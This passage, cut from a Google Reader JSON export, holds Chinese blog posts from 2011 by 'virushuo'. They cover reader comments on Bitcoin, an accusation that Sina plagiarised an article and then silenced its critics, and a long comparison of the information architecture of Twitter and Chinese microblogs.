留言中有价值补充的我贴在这里，谢谢各位</p>\n\n<p>两个反馈：<br>\n第一个是基于第4点，你说的其实没错，但是容易让一知半解的人误解，认为他个人付出的计算量就是劳动了，而每个劳动必须要获得回报。其实不尽然，其实那新产出的部分应该是对当时P2P网络上所有计算结点的犒劳，并不等价最终获得奖励的那个人付出的。其实最终是谁获得还真就是人为目的地尽可能随机分散分布，来保证BITCOIN的整个体系。而体系认为就算把这个时段集体的劳动结果撞大运似地分给某个个人，最终也会进入流通而造福所有的使用者。只是一点补充，怕其他人误解</p>\n\n<p>第二点是关于WOW的那段补充，WOW金币的贬值倒真不是玩家发现了很强大的增发手段，当然的确有，但是那个对兑换价值的影响没有那么巨大，并且缓慢。真正成倍数贬值的还是BLZ自己的版本升级，调整了任务和掉落的金币产出，所以从数字上来说产生了金币的贬值。这点上还是印证了央行的不靠谱。 但就算是这种情况下，受概率影响的极品装备只要概率不调整，在一定的时期内价值还是稳定的，虽然你需要用更多的WOW金币去购买，但你购买更多金币所需的实体货币RMB数量没有太大变化，改变的只有汇率，但是真实的购买力没有变化</p>\n\n<p>Posted by: Gossipsama | May 23, 2011 4:30 PM</p>\n\n<p>原本还想写一篇关于 BTC 的私密性的 blog 的 :) 不过突然这个这么热，又不想赶热点了。</p>\n\n<p>BTC 的 wiki 上关于 Anonymity 的页很有意思，居然拿 live in China 做假设。而且提到了 baidu ;)</p>\n\n<p>MyBitcoin 是个有趣的服务，可以用来解决许多私密性的问题。</p>\n\n<p>Posted by: Cloud | May 23, 2011 4:31 PM</p>"
    },
    "author" : "virushuo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds2.feedburner.com/virushuo",
      "title" : "demo@virushuo",
      "htmlUrl" : "http://blog.devep.net/virushuo/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1313370749577",
    "timestampUsec" : "1313370749577900",
    "id" : "tag:google.com,2005:reader/item/8adfee43fd8d7eb8",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "随便" ],
    "title" : "新浪微博你让我浑身发冷",
    "published" : 1307607077,
    "updated" : 1307644718,
    "alternate" : [ {
      "href" : "http://blog.devep.net/virushuo/2011/06/09/post_81.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>------<br>\n本文特别声明，本文和其中使用的图片均可任意转载和使用。感谢传播。<br>\n------</p>\n\n<p>新浪做为中国最早的在美上市互联网公司，一直在诚信方面有不错的口碑，美誉度较高。很多事情人们甚至会替他们辩解，在中国开个公司不容易，要多往好处看。所以今天发现这个公司可以无耻到这么彻底的时候，确实让人发冷。</p>\n\n<p>事情的起因很简单，google的新闻站<a href=\"http://guao.hk\">谷奥</a>发现一篇译文被新浪科技抄袭，这里说抄袭是有证据的，因为就连谷奥翻译错了的地方，新浪科技也照单全收一字不差还原错误翻译。这是一个基本的常识，大家都写对了那是正常的，如果错都能错成一样，那显然是有问题。 <a href=\"http://b.gkp.cc/2011/06/04/guao-and-sex-lang-similar-article/\">谷奥列出新浪抄袭证据的原文在此</a> ，有兴趣可以仔细看。</p>\n\n<p>这事情只是个开头。后面的才精彩。一般来说这种事情行内多了去，大家抄来抄去，被揪住一次也就嬉皮笑脸道个歉，被抄一方也不会在追究，也就过去了。奇怪的是新浪这次用了一个奇怪的方法，把这个事情弄的越来越大。</p>\n\n<p>首先是新浪科技的编辑骂谷奥傻逼（这在后面新浪科技发的官方声明中变成了\"新浪科技编辑骂了两个字母进行回应\"），然后总编辑陈彤在微博痛骂谷奥，引起大量用户评论数百条，这些评论先被删至剩30条，随后又恢复，转天这条微博也被删。不过<a href=\"http://file.guao.cc/201106-sina/laochen_weibo_full.jpg\">这里有截图</a>。</p>\n\n<p>转天谷奥创始人到新浪沟通抄袭事件，新浪仍然拒不承认抄袭。至于\"错都错的一样\"这种铁证，新浪装作没看到。之后的事情更加戏剧。</p>\n\n<p>新浪科技发了<a href=\"http://tech.sina.com.cn/i/2011-06-08/15345623475.shtml\">一篇新闻</a>，表示自己绝无抄袭。这篇新闻的留言中凡是对新浪不利的言论一律不显示，只有几条夸新浪的留言显示出来。之后干脆关闭了评论。这篇新闻的结尾是：\"新浪科技频道重申：感谢社会各界一直以来的大力支持，欢迎大家继续对新浪科技的工作批评、指正。\"，这虚伪的像个笑话，人家批评你们骂人家，新闻评论都不敢开放，还好意思说欢迎批评。</p>\n\n<p>很快，新浪微博小秘书威胁谷奥官方帐号不要造谣，最终结果是谷奥官方帐号变成了号称先审后发，其实不能发表状态，之前发布的和此事相关的微博均被删除或隐藏。谷奥是加V认证的帐号。</p>\n\n<p>事件简要回顾完毕。</p>\n\n<p>这个事件的谷奥一方，是一个只有2个人的个人网站，另外一方是市值近70亿美元的上市公司。这样的实力对比下，新浪从高管到员工，倾全力打压一个个人网站。原因只不过是谷奥对被新浪抄袭事件要个说法。这种底气的来源大概就是微博的发展，新浪已经可以认为，我打压你，你无法还手。</p>\n\n<p>以往人们在媒体无法表达的事情，可以在自媒体和sns表达，如果新浪垄断了微博，将来只要你和新浪有冲突，或者你的东西被新浪看上认为可以盈利，你在自媒体也就出不了声了。新浪产品线复杂人也多，谁都有可能不留神和他们发生冲突。</p>\n\n<p>之前作家和百度的维权事件，新浪微博是主战场之一，但新浪爱问同样盗版他们的小说。如果作家们质疑一下爱问，恐怕结果也是被封杀。诸如此类的事情，以前有不少，以后会发生的更多。比如一家基于新浪做SNS游戏的公司，新浪自己想抢你的业务，你会没法还手，没法出声。所有在新浪微博培养的关系，粉丝，声誉，都不是你的资源，而是新浪的。只不过是对方看你还不算讨厌，暂时让你存在而已。一旦和新浪有冲突，这些都没了。现在看好新浪，爱微博的人，如果有一天发现自己的利益被新浪所占，又无处申诉，感觉会怎么样？这种事情之前也发生过，恐怕除了当事人，别人都没注意，比如新浪微博曾经<a href=\"http://tech.163.com/11/0421/22/726QF6U5000915BF.html\">强制收回大量特殊微博账号 </a>，这些叫做微招聘，微公益的帐号，起初都是因为用户对这个平台的热爱而自己注册和维护的，做大之后被强制收回。关于这个事情，可以看微公益帐号创造者所写的事情经过：<a href=\"http://www.tianya.cn/publicforum/content/free/1/2127326.shtml\">新浪\"微博强拆\"，拆走的都是用户的心</a> 。这是发生在今年3，4月份的事。</p>\n\n<p>在这个事情之后，所谓的新浪微博开放，做为开发者的我是不会再相信了。新浪科技和谷奥只是义气之争尚且如此，利益之争会如何？一个平台，丧失了中立理性和宽容，不能面对自己的错误，无法改正，乱用资源和强权，一定不会成功。毕竟互联网还是一个存在充分竞争的行业。</p>\n\n<p>如果新浪微博真的垄断了这个行业，未来他的业务线一定会和你发生竞争。微博和以往的SNS不同，是工具也是媒体。一般来说人们碰到不公可以寻求媒体救济，但在新浪这，你没机会。在媒体和舆论上会成一边倒的状态。看这次新浪科技的声明，内容完全不真实，但被攻击的一方只是个人网站，没办法找到一个话语权对等的平台回应。无论你是什么样的名人，都没机会。目前在新浪平台受益的人，都应该好好思考一下如果这样发展下去，你的未来是什么。投资人们，如果你的项目被新浪先看中，如果你们的项目被新浪山寨，做营销的，如果新浪想自己赚营销这笔钱，做自己的营销平台，创业者，你做的产品被腾讯山寨的时候你可以骂，将来被新浪山寨了，你怎么办？...在新浪微博平台上，你们拥有的资产，都在新浪老大哥的垄断之下，剩下的无非就是什么时候杀你这只肥猪而已。最后你最多像已经没法发言的@谷奥现在做的那样，把自己的文章链接写在bio中，新浪真是欺人太甚。</p>\n\n<p>这样的未来，让我浑身发冷。中国之前任何一家互联网公司，无论是百度还是腾讯，都没能把事情做到这么绝，就算是腾讯，也不会因为用户在QQ中交流对腾讯的不满而封掉用户的发言权利。我始终认为，microblog应该是一种协议而不是一种工具。这种工具应该打通几家，而不是被一家拥有。就像邮箱一样，协议和产品需要分开，你可以用新浪邮箱我用gmail他用网易邮箱，我们互相能收到对方的消息，而不能是必须大家都去用一家的邮箱。我觉得如果实在不行，搜狐网易饭否联合吧，打通你们的API，让用户流动起来，别坐等被人各个击破。</p>\n\n<p>为了不让这个一家垄断的未来成真，现在能做的就是力图让几家竞争者平衡，至少应该留下足够强的竞争力量，所以我呼吁停止使用新浪微博，转向腾讯，饭否，网易，搜狐。这个行为看起来有点赌气，可是想到未来，这是为将来的自己留后路。就算你不想那么多，现在开始给自己在其他几家的平台上培养一些资产，留作备份，也是应该的。也就是说，无论你是否停用新浪微博，如果你觉得这个自媒体平台有意义，那就应该立刻把几家全开了，一起用，这样你才能安全，至少将来还有渠道说自己要说的话。</p>\n\n<p>在现实世界我们已经充分体会到了一家独大没有竞争的后果，幸好在虚拟世界，现在你还有机会亲手改变。</p>\n\n<p><br>\n====================================</p>\n\n<p>下面这两个badge是我的选择：</p>\n\n<p><img src=\"http://blog.devep.net/virushuo/upload/images/nosina.png\"><br>\n<img src=\"http://blog.devep.net/virushuo/upload/images/refusesina.png\"></p>\n\n<p>我把他们放在blog侧面，就算为多样化的未来出点力。你的选择？</p>\n\n<p><a href=\"http://blog.xiqiao.info/2011/06/09/1054\">这里还有更多图样可以选</a>，挑个你喜欢的吧。 <br>\nps，为了实践我的建议，除了twitter，本人恢复更新网易微博 @virushuo 饭否 @virushuo 我还会开国内其他几家的。每天均花一些时间真人更新，同时无限期停止更新新浪，并求新浪删我帐号。大家墙内见。</p>"
    },
    "author" : "virushuo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds2.feedburner.com/virushuo",
      "title" : "demo@virushuo",
      "htmlUrl" : "http://blog.devep.net/virushuo/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1313370748910",
    "timestampUsec" : "1313370748910028",
    "id" : "tag:google.com,2005:reader/item/4affb00dbc3ae19b",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "随便" ],
    "title" : "microblogging和微博信息架构产品差距和影响",
    "published" : 1309077874,
    "updated" : 1309152745,
    "alternate" : [ {
      "href" : "http://blog.devep.net/virushuo/2011/06/26/microblogging.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>前一段时间仔细的把国内的微博产品都研究了一圈。所以我终于可以写这篇文章了。</p>\n\n<p>这个话题说起来很复杂，我从信息架构开始说，后面涉及传播方式，社群，阅读负担和信息过滤，第三方和开放性几个方面。最后会使用我blog这几年的访问数据对新浪微博和twitter传播能力做一个简要分析。</p>\n\n<p>以下除特指某一家的产品，我用国内微博代表国内除饭否之外所有其他微博，因为他们产品都很相似。</p>\n\n<h3>一 信息架构</h3>\n\n<p>twitter中所有信息是平等的，没有一些信息会比另外一些更加平等。这里没有所谓的评论，你可以选取喜欢的形式用RT的方式加上评论，如果不想被更多人看到，可以直接回复对方，如果只想转发，可以使用Retweet。在twitter的架构中，只有这种层级完全一样的信息。twitter不提供类似于国内\"微博\"的评论功能，因为一旦有评论，信息就不再平等。</p>\n\n<p>而国内除饭否外，所有的微博都加上了评论。这是一个非常容易做出的抉择，因为总有人会说\"没有评论不方便\"。加上评论看上去很好，也并不难。不过问题也出现了。</p>\n\n<p>评论让信息不再平等，发出的微博是主要的，其下所有的评论附属其上。一条微博一旦被删除，其下的评论也随之消失，这也充分体现了他们之间的从属关系。如果不特意展开去查看评论，一般情况下评论是不会被更多人看见的。甚至发出评论者的follower(墙内叫粉丝，关注者）都看不到。这样就严重降低了信息的利用效率。在twitter这种信息平等的系统中，我用RT形式发出的评论会被我的follower看到，也会进入公共timeline。这些评论会再次引起讨论或被RT。这些RT同样帮助传播了我所评论的信息。这样的信息传播速度和力度是在其他系统中没法实现的。</p>\n\n<p>为了解决这个问题，国内的微博同样也有了转发功能。转发又分评论和不评论两种，无论哪一种转发，转发过的内容都成为转发者的一条微博，这种微博同样可以被再次转发和评论。于是问题又出现了，这些评论是附属于被转发过的微博，而不是原始的微博，于是这些评论也很难被最原始的作者看到，只能被转发者看到。</p>\n\n<p>在转发的微博上的评论层级就更低了，不仅评论者的follower看不到，连本来应该看到的原始作者也看不到。</p>\n\n<p>更糟糕的还在后面，<del>发表评论的人，也没办法回溯自己发出过的评论。除非他记录下来所有发表过评论的地址</del> 经推友提示，发现这个功能是有的，先点右侧我的评论，然后点上面发出的评论。在twitter的系统中，用户创造的任何信息都是属于用户的，都会出现在用户的Timeline中，这些都是用户的数字资产，不应该被轻易丢弃。而在国内微博的系统中，评论只是二等公民，这些信息一旦发出，和创造者就没什么关系了，创造者很难回溯，这些信息也会随着原微博作者的删除和消失。当然，在这些为了自己的利益可以随便修改用户帐号，删除用户信息甚至禁言的产品中，让用户创造的信息消失从来也不是什么必须考虑的问题。</p>\n\n<p>可见，评论虽然创造了一些方便，但带来的麻烦也不少。不过国内的这些微博的产品定义也有不同，他们并没有想制造一个平等的信息生态，而是制造一种名人发言，普通人收听的信息系统，这比传统的报纸广播电视略有进步，距离twitter这种完全平等，高效快速的信息系统差距仍然很大。</p>\n\n<p>鉴于其产品定位，名人会觉得更加满意，更有万人来朝的快感。而评论被传播的效率很低，也使名人在出丑的时候不那么容易被更多人知道，也算是一种保护机制。</p>\n\n<p>从本质上说，国内的微博都是BBS的变种，甚至可以是新闻评论的变种。对比一下网易新闻的跟贴，除了没有人物姓名，似乎也没多大差距。</p>\n\n<p>国内微博到现在为止没有给评论再加上评论，如果有这个功能，就可以在微博下面盖网易新闻评论的那种楼了，也更方便吵架。从KPI和用户活跃数上看应该会更加好看，所以很可以期望在未来的某一天会有人加上这个功能--按照他们的逻辑，这也能让用户更加方便，不是吗？</p>\n\n<p>很多人号称新浪有评论，所以用户体验比twitter好。我觉得谈产品体验是一个专业的事，不是随便一个谁觉得什么好就是好的，用户体验这个词因为太容易理解，使得评论起来毫无难度，其实多数人对产品体验的评价都流于表面，非常肤浅。增加一个评论功能，这是多简单的事，无论twitter还是饭否，想加上这种功能都毫无难度，为什么他们不做？这背后自然是有道理的。【刚刚发现一个好玩的例子，列在文末的update1中】</p>\n\n<p>注，国内微博可以使用\"评论同时作为我的微博发布\"方式，下面一节会提到转发+评论方式，但仍然有相当比例的信息单纯成为评论而损失掉。</p>\n\n<h3>二 信息传播</h3>\n\n<p>twitter的意义在于改变了信息传播的方式。在此之前，人们早有单中心传播方式（广播电视平媒），也有单中心带少量互动的传播方式（广播电视+短信互动），也有多中心群组传播方式（BBS，邮件组），这些传播方式共有的好处是声音可以被放大到极大，缺点是信息传播途径被垄断，普通人乃至名人都没法发出自己真正的声音。</p>\n\n<p>twitter创造了一种完全独立的信息传播方式，无中心，双向，无群组，所有信息都在一个层级上迅速流动。这是一个巨大的放大器，尽管twitter也存在fo数量多少而导致部分名人有中心化的趋势，但总体来说，这还是目前让最平衡的传播方式。</p>\n\n<p>国内微博和BBS类似，是多中心群组传播方式。</p>\n\n<p>在twitter，只要你的信息引起了别人讨论，在讨论的同时就被传播了，传播的同时又可以被引发新的讨论，信息顺着无数条链路快速传播开，边传播边分裂出更多分支，这是一种如同核爆一样的链式传播。</p>\n\n<p>在国内微博，如果所有人都采用转发+评论方式，一条微博发出之后的传播路线和twitter是类似的。但有了非转发的评论，一切都变得不同。假设有1/4的人采用评论，而不是转发的方式发表自己对原微博的看法（事实上远远高于这个比例），那么就有1/4本来可以引发链式传播的机会被彻底消灭。原本这些评论可能会引起更多评论，也可能引发其他特别事件，但是一旦进入国内微博的评论系统，他们就消失了，几乎没机会再进入传播流程。</p>\n\n<p>国内微博这种系统更适合于名人，他们的粉丝数量足够多，以至于他们可以不在意这1/4的传播效率损耗，甚至1/2的传播损耗他们仍然可以无所谓。甚至他们可以干脆不去看评论，客观上降低了他们处理信息的压力。但对于普通人，这种系统是残酷的，结果就会导致普通人发出的信息没人回应，得不到传播。钱明奇在新浪微博呆了半年，他的信息并不是不重要，但传播开了吗？在这种系统里面，草根是无力的，普通人聚集多少人，也没办法让信息真正充分传播，必须要借助官方或者名人的力量才有可能。</p>\n\n<p>这不还是BBS或者广播电台吗？只不过多给普通人一些幻觉，让他们觉得距离名人更近...其实，就算没有微博，名人的声音也能被充分放大，他们的话语权本来就比普通人大的多，而无论有没有微博，普通人仍然得不到传播机会。但在twitter这样的产品中，一切都不同了，普通人也会得到属于他们的传播机会，但这也正是名人不爽的，一方面他们一旦出错，就会被痛击，很难装下去，另外一方面他们仍然愿意垄断信息传播途径，并不愿意和普通人分享。</p>\n\n<p>简单概括twitter，即，一切归于Timeline，这是整个系统中最重要，最基础的部分。无论是信息本身，还是传播方式，最终一切形成了每个人的Timeline，这些Timeline根据fo的关系不同千变万化，形成丰富而多样的生态环境。</p>\n\n<h3>三 社群关系</h3>\n\n<p>twitter的社群关系是建立在前面所说的，平等的信息架构和极快的链式传播基础上。在这种基础上建立起来的社会关系非常牢靠，信任度也更高。</p>\n\n<p>因为信息架构平等，所以信息更容易被重视。因为传播极快，也就更容易找到欣赏的人。一切都归于Timeline，哪怕是随便对什么事情发表的评论也都很容易被查到，通过Timeline就更容易了解一个人的品味和趋向。</p>\n\n<p>平等的信息也带来平等关系，无论是不是名人，只要在twitter和其他人产生互动，就会促进社群的形成，社群的形成也一样是链式的，人们可以根据很多碎片信息而决定互相fo，进一步交流。最终形成无数虚拟社群。</p>\n\n<p>国内微博，信息被划分了层次，人也就随之划分了层次。评论微博的人很难和发微博的人产生更多互动，也不会有更多人看到这种互动，想了解一个人，只能在他Timeline中看到正经八百的转发和原创，没法追溯他对若干事情的看法。这样就很难建立信任。</p>\n\n<p>这些基础影响的事情很多，几乎下面要说道的所有问题都是被这两个基础因素所影响。确实，什么样的土地，就会结出什么样的果实。一个社区的关系形成和产品是有关的，一些逻辑的权衡最后会决定用户行为，最终改变用户关系。twitter的用户关系并不是因为大部分中文用户不能访问，在当年twitter可以访问时，用户也是这样的关系，社群也是这样的氛围，从未改变过。对于一个SNS产品来说，最终形成牢靠关系才是最重要的，这是对用户最大的方便，其他能不能传图片，能不能发评论，与此相比都太细枝末节。为了完成最重要的目标，甚至必须舍弃一些用户体验才能达到，正所谓行大事者不拘小节。下面一节我会分析为什么web不能传图片是好的行为。</p>\n\n<p>很多人讲，其实并不喜欢微博，也觉得浪费了很多时间，只是因为有用，或者推广和工作需要，不得不用。这也是一个有趣的现象，这种话我听到了太多太多次，以至于我怀疑是不是新浪微博就是一帮推销自己东西的人凑到了一起。每个人都想推销点东西给别人，借助别人力量完成自己的目标。</p>\n\n<p>假设新浪微博是有用的，但twitter是有爱的。twitter是一个温暖真实的社区，大家都是靠着自己的兴趣生存。同样有人在这里完成各种交易，找到工作或合作伙伴，找到朋友，伴侣。一个有爱的社区同样会节约人们更多时间，集中于生活本身。</p>\n\n<p>其实没什么东西是免费的。无论是利用社会媒体推广还是其他方式，都需要花费时间学习，也可能需要花钱。对于我所见的大部分企业，包括声称从微博获得很多好处的企业和个人，如果他们可以精心维护一个blog，写一些有意义的文章（而不是赤裸裸的产品推荐），同样时间会被传播开并获得商业机会。而且blog几乎永存，更容易被检索，微博如流水，24小时之后就都流过去了，blog始终存在，易于查看，一次写作后面很多年都起作用。如果能写出来真的好文章，时间越长，意义越大。</p>\n\n<p>人们总希望去寻找省事的捷径，比如他们认为微博推广是一条捷径，事实上任何事情都没有捷径，捷径都是幻觉。</p>\n\n<p>认为微博营销省钱的，他们忘记了花掉多少时间沉迷于此。时间不能用钱衡量，因为时间就是命。浪费生命省一些钱，值得吗？和评价产品好坏类似，这也是可衡量的KPI和不可衡量的潜在影响对比，人们不太愿意（或者没有足够能力）关注后者。</p>\n\n<p>想获取知识的，如果你没耐心去看书或者开放课程，那么至少应该看一些认真写作的blog。我不认为140个字（或者被国内微博创新的+140字评论）能够给别人真正的意义，我相信我这篇blog有意义，但这不可能用140个字说完，为了让这个事情说清楚，有意义，能存在下去，我需要回到blog完成它，在此之前，我花费了几个月时间思考，研究，体验，最终又花费几个小时写，几个小时改。才能成为你看到的全文，随手发的140个字不可能有这种效果。</p>\n\n<p>SNS的本质还是社会关系，有爱的关系比有用的关系好。</p>\n\n<h3>四 阅读负担和信息过滤</h3>\n\n<p>微博类产品因为信息刷新太快，所以造成了比以往RSS更严重的阅读压力，让人们阅读负担大大加重。也在其上花费掉更多时间，节约阅读负担问题非常重要。</p>\n\n<p>twitter基础是140个字，其中可以加入链接，如果使用短链接能节约一些空间。但总体的140个字不会变。twtter没有评论，只能RT并评论，这样带来的好处是信息非常规整，一般一条信息高度不会超过100像素，在屏幕上一页内可以显示更多内容，更容易用浏览方式扫过，重复信息，图片等干扰小的多。</p>\n\n<p>对比国内微博，因为有评论和转发的机制，导致一条140字的微博下面还要带一条原始微博，有的两者还都带图片。这样被反复转发之后Timeline会充满同样的内容，每一条还都占用了200像素以上的高度，这对Timeline破坏严重。阅读压力也就更大。</p>\n\n<p>换言之，在单位时间能我能完成阅读的twitter信息数量远远大于国内微博，阅读数量足够多，才能fo更多人，处理（RT或评论）更多信息，和更多人交流，整个系统也因此更加活跃。</p>\n\n<p>对比两张图，左边是twitter官网和两种常用客户端，右边是新浪微博。可以看到右边同样的高度只能容纳很少信息，新浪微博一条信息高度轻松突破200像素，转发如果带上图片能突破500像素。相对于twitter的100像素，新浪微博阅读效率低的太多了。换言之，微博控会比同样程度的twitter控，花费更多时间或获取更少信息，能进行转发或交流的数量也同样有这么大的差距。</p>\n\n<p>对比以下两张图，很明显就可以看出在同样页面高度内，twitter可以比新浪微博多容纳多少信息。</p>\n\n<p>twitter的web页面和主流客户端（点击放大）:</p>\n\n<p><a href=\"http://blog.devep.net/virushuo/upload/images/twitter_20110624_01.jpg\"><img src=\"http://blog.devep.net/virushuo/upload/images/twitter_20110624_02.jpg\"></a></p>\n\n<p>新浪微博web页面（点击放大）:<br>\n<a href=\"http://blog.devep.net/virushuo/upload/images/sina_20110624_01.jpg\"><img src=\"http://blog.devep.net/virushuo/upload/images/sina_20110624_02.jpg\"></a></p>\n\n<p><br>\ntwitter严格保证了140个字，不会耍把网址当作一个字符这种小聪明，也不会让你附带一张照片不算字数。在twitter世界里，一切都是有价值的，写了链接放了照片或者视频，就只能少写几个字。这个原则来源于短信，既然人们用140个字的短信可以交流，那么140个字的tweet当然也可以，何况中文140个字已经比英文表现力强多了。</p>\n\n<p>如果要发表你的评论，对方又写的太长，那么你只能人工缩减一下，要么简化你的看法，要么就光写你的看法只附带上对方ID。这些用法不是twitter设计出来的，是用户约定俗成的规则。这种自然形成的规则同样也降低信息过载机会，如果人工缩减内容，相当于人工减少垃圾信息，这是任何算法目前都无法做到的，这里碰巧通过人工完成了。当然缺点也一样存在，比如会导致删改原文，会导致意思被误解...但就算有这些缺点，我也仍然喜欢这种方法，加快信息流动速度的方法都是好方法，降低信息过载机会，就能节约人们处理信息时间，最终又加快信息流动速度。</p>\n\n<p>在产品设计上，twitter一直贯彻这个原则。</p>\n\n<p>twitter的手机客户端，可以很方便上传图片，但web版不可以，这是为什么呢？因为twitter不是照片分享站，大多数情况你的图片对别人意义不大，所以就不要上传干扰别人了，如果非要上传，可以随便上传到照片分享站，贴链接过来。而手机客户端分享照片需求很大，这些照片有实时性，具备分享意义。国内微博都提供了网站直接分享照片功能，结果就是大量无用信息（很多是商业推广）下面贴上一张和正文完全不相关的美女图和搞笑图，以期望获得更多转发。这种东西完全是破坏用户正常阅读，增加用户阅读负担。这本质是国内微博对富媒体滥用，导致富媒体信息更受欢迎，最终形成一个恶性循环，人们只关注带有强烈刺激富媒体的信息，更为简洁有效的文本信息受到的关注度被严重降低，以至于真正有意义的内容也得不到关注。再看前面的新浪微博，截图，看第一条中国企业家所发的内容和图片，他们之间有关系吗？毫无关系。就是这种毫无关系的图片在新浪微博满天飞，白白浪费人们的时间。</p>\n\n<p>用户能在web分享照片看起来确实方便，其实背后对环境破坏有多大，是没法衡量的。不过职业经理人们只关心前者，无法考量的后者他们并不在乎。管这个叫做\"功能友好\"的人们，何等浅薄。</p>\n\n<p>概括起来，无论是链接占一个字符还是可以附带图片字符不占字，本质上都是让富媒体内容变得和普通信息不平等，记得前面所说的微博和评论不平等吗？富媒体又加重了这种不平等。</p>\n\n<p>我在twitter说出这个关于web为何不应该有照片分享功能的看法时，有人告诉我他问过王兴这个问题（饭否也同样不能在web分享照片），王兴也做了类似回答。</p>\n\n<p>twitter的web版也同样权衡了用户使用方便性，每条信息右上角都有小图标标记信息属性，比如图片，视频，或者有对话线索。点击信息右侧即可展开，图片视频都可以直接看到，如果有对话线索，右侧则会一次展开相关所有tweet，这种基于线索展开的对话，比国内那种一条微博下面讨论意义大的多，既可以形成讨论，又不降低任何一条信息层级。</p>\n\n<p>换言之，twitter的设计不强迫用户必须阅读富媒体内容，除非用户主动展开信息阅读。在信息严重过载的年代，这种设计非常有意义。如果文字内容有趣，我会愿意多看，但如果我不愿意看，也请不要占用我的页面空间浪费我的阅读时间。</p>\n\n<h3>五  一些原则和第三方软件</h3>\n\n<p>twitter产品形成过程很奇怪。这个产品功能改造来自用户和社群，而不是来自twitter公司。今天人们看到的twitter和几年前我刚刚开始用的时候完全不同。原因是twitter只创造了信息架构和API，之后就不再管了。</p>\n\n<p>阴差阳错也好，运气也好，认为twitter公司能力差也好，人手不够，偷懒也好，他们确实只是设计好信息架构和API，没做更多的事，之后用户登场了。这就是开放平台的好处，用户可以按照自己想要的去完善。不同的人心目中有不同的完美产品，于是各种完全不同的客户端和第三方网站同时被不同的人使用，最终所有信息对聚集回twitter的信息架构中。这也是一个历史上从未出现过的事。在twitter之后，从信息架构和API开始的产品设计逐渐成为一种开发方法，影响深远。</p>\n\n<p>说twitter刻意保持网站的简陋也不太对，不过twitter保持网站只能完成最基本的功能（可能只是偷懒），确实对生态圈完善有帮助。一方面简陋的网站清晰演示了核心功能和信息架构，一方面也确实留给了第三方开发者更多空间。缺点也确实让新人不容易入手。（这几年有不好的趋势，twitter对第三方开发者也逐渐收紧政策，希望以后不要变得更糟）</p>\n\n<p>twitter大概有最丰富的第三方软件，除了官方软件优秀流畅（收购的tweetie团队，tweetie团队首先在移动设备上发明了\"下拉更新\"操作，现在已经成为触摸屏上刷新信息标准动作），还有s60上的神器gravity，信息过滤最方便的hootsuite，最华丽的tweetbot，简洁快速支持stream API的echofon。所以我一直说，twitter是一种协议，你可以在这个协议之上创造任何你喜欢的东西。国内所有微博都是一种产品，附着了太多商业目的，这两者不在一个层次上。</p>\n\n<p>说到tweetbot，值得特别讲一下他们的故事。这个iPhone软件开发团队只有两个人，他们开始做tweetbot的时候，twitter还没有收购tweetie团队，也就是说没有官方软件。开发进行了半年，收购完成，twitter把过去收费的tweetie变成了免费官方软件。这对于tweetbot这种希望销售软件的团队打击很大。不过他们还是坚持又做了半年，完成了tweetbot。这个软件上了appstore立刻热卖，人们都很喜欢，因为其特点太鲜明了。除了功能全面，最重要的就是华丽，操作感，绘图，声音，无一不经过精心打磨，完美到极致。在官方客户端已经做到足够好的时代，仍然有这样一个收费软件出现，仍然受到用户欢迎，实在是一个奇迹。就算你觉得twitter不怎么样，也强烈推荐感受一下这个软件，绝对值得$1.99这个价格。这也是有爱和有用的区别，twitter产业链上虽然也有商业spam，但活跃了很多真正热爱他，全神贯注只关心做好产品的人，这些人制造了独一无二的产品和体验。</p>\n\n<p>twitter是需要学习的。我完全不同意\"好产品不需要学习\"这种说法。事实上人类社会大部分有意义的东西都需要学习，不需要学习的除了维持基本生命的动物性就只有一些毫无意义的事。完全不需要学习的有什么？大概只有吃饭和睡觉，或者看肥皂剧发呆。就算是吃饭，如果要吃的好，也同样需要学习。其他可以带来更多意义的东西，无论是计算机本身，或者是各种工作技能，都需要学习和长时间的锻炼。如果不学，连使用计算机和用键盘打字都有难度。</p>\n\n<p>花费一些时间理解这个世界的规则，理解人们的生活方式，找到适合你的客户端，twitter就无比强大。这其实和真实社会更相似，twitter是信息流动更快，更刺激，放大效应更明显的真实社会，这里也有名利场，但也有真实社会的可爱和温暖。就算是你很普通，但只要你的观点有价值，一样会被传播开，一样很多人fo你。国内微博就是名利场，如果你有个吓人的头衔，那么只需去机场书店买一本成功学，每天抄几句，一样会被人捧上天。</p>\n\n<p>twitter基础是公平的，信息可以安全保存，你可以信任他。新浪微博我们不谈敏感信息，涉及他本身的不敏感信息也一样被删，上次<a href=\"http://blog.devep.net/virushuo/2011/06/09/post_81.html\">谷奥指责新浪抄袭</a>，结果不是被禁言了吗？没有公平信念，就不会有真正好的SNS产品。</p>\n\n<p>如果有可能，我觉得所有人都应该试试twitter，体验一下这样一个前所未有的产品是什么样，感受一下这个人不多但传播能力惊人的社区。如果有困难，可以去试试国内twitter最正宗的继承者饭否。王兴山寨了很多东西，他的可贵之处是同时山寨回来了开放和气度。饭否至今不加评论功能，难能可贵。所以饭否用户和twitter用户具有很多同样的特征，他们同样有爱，也有同样的效率。被关站一年的饭否，归来之后仍然获得了当年忠诚的那批用户，这些用户在饭否活跃度极高（如前所述，也和饭否产品设计简洁有关）。</p>\n\n<p>微博的战争其实刚刚开始，目前的新浪微博只是恰好符合新浪的传媒特征，也和之前的名人博客有联系。这些名人本来就有话语权，让人们感觉新浪微博非常火。其实距离战争结束相差很远。无论是腾讯网易和搜狐，最糟糕的策略就是跟随新浪，不幸的是目前这三家都采用了这个策略。真心希望各家以自己的特点为基础，做出来有特色的东西，真正让micro blogging成为协议。就我的体验看来，无论用户质量，活跃度还是产品，饭否仍然很棒，希望饭否能继续改善产品，早日赶上。</p>\n\n<h3>六 